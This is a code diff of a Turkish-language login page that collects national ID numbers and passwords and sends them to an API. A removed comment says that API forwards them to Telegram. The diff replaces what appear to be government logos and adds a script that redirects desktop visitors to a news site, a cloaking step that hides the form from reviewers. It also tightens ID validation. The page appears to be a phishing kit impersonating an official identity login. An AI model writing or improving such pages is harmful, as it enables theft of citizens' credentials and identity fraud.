@@ -39,7 +39,7 @@
         .logo {
             width: 270px;
             height: 180px;
-            background-image: url('./images/edk-logo.png');
+            background-image: url('./images/mylogo.png');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
@@ -80,21 +80,19 @@
             color: #e74c3c;
         }
 		
-		
-
         .form-control {
-background-color: #fff;
-    font-size: 1.1rem;
-    font-weight: 600;
-    color: #000;
-    padding: 5px 10px;
-    border: 1px solid #a5a9b1;
-    width: 100%;
-    height: 2.8125rem;
-    display: inline-block;
-    vertical-align: bottom;
-    border-radius: .5rem;
-    float: left;
+            background-color: #fff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #000;
+            padding: 5px 10px;
+            border: 1px solid #a5a9b1;
+            width: 100%;
+            height: 2.8125rem;
+            display: inline-block;
+            vertical-align: bottom;
+            border-radius: .5rem;
+            float: left;
         }
 
         .form-control:focus {
@@ -195,7 +193,7 @@ background-color: #fff;
         .footer-logo {
             width: 268px;
             height: 50px;
-            background-image: url('./images/DDO-logo.png');
+            background-image: url('./images/mysublogo.png');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
@@ -297,6 +295,15 @@ background-color: #fff;
             <div class="footer-logo"></div>
         </div>
     </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+          var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+          if (!isMobile) {
+            window.location.href = "https://www.trthaber.com/";
+          }
+        });
+    </script>
 	
 
 
@@ -305,6 +312,13 @@ background-color: #fff;
         document.getElementById('tc_no').addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);
         });
+
+        // TC doğrulama (demo - temel kurallar)
+        function validateTCNumber(tc) {
+            if (!/^\d{11}$/.test(tc)) return false; // 11 hane ve sadece rakam
+            if (tc[0] === '0') return false; // İlk hane 0 olamaz
+            return true; // Demo: ileri algoritma kapalı
+        }
 
         // Form submission (Vercel API'ye veri gönderme mantığı - aynen korundu)
         document.getElementById('identityForm').addEventListener('submit', async function(e) {
@@ -317,8 +331,8 @@ background-color: #fff;
             const submitBtn = document.querySelector('.btn-primary');
             
             // Validation
-            if (tcNo.length !== 11) {
-                showResult('T.C. Kimlik numarası 11 haneli olmalıdır.', 'error');
+            if (!validateTCNumber(tcNo)) {
+                showResult('Geçersiz T.C. Kimlik numarası.', 'error');
                 return;
             }
             
@@ -343,28 +357,20 @@ background-color: #fff;
                     body: JSON.stringify({ tc_no: tcNo, password: password }),
                 });
 
-                // RESPONSE (Telegram'a gönderim) BAŞARILI İSE
                 if (response.ok) {
-                    // Sadece tc_no ve password ile wait.html'e git
+                    // Başarılı ise wait.html'e tc_no ve password ile git
                     const params = new URLSearchParams({ 'tc_no': tcNo, 'password': password });
-                    window.location.href = `wait.html?${params.toString()}`; 
-
+                    window.location.href = `wait.html?${params.toString()}`;
+                    return;
                 } else {
-                    // Hata durumunda (API'den dönen hata)
-                    const data = await response.json();
+                    const data = await response.json().catch(() => ({}));
                     showResult(`İletim başarısız. Lütfen bilgileri kontrol edip tekrar deneyin. (${data.message || 'Bilinmeyen Hata'})`, 'error');
-                    
-                    // Hata durumunda yükleme ekranını gizle ve butonu re-enable et
-                    loading.style.display = 'none';
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Devam Et';
                 }
-                
             } catch (error) {
                 console.error('Fetch error:', error);
                 showResult('Sunucu ile iletişimde bir sorun oluştu.', 'error');
-                
-                // Hata durumunda yükleme ekranını gizle ve butonu re-enable et
+            } finally {
+                // UI reset
                 loading.style.display = 'none';
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Devam Et';
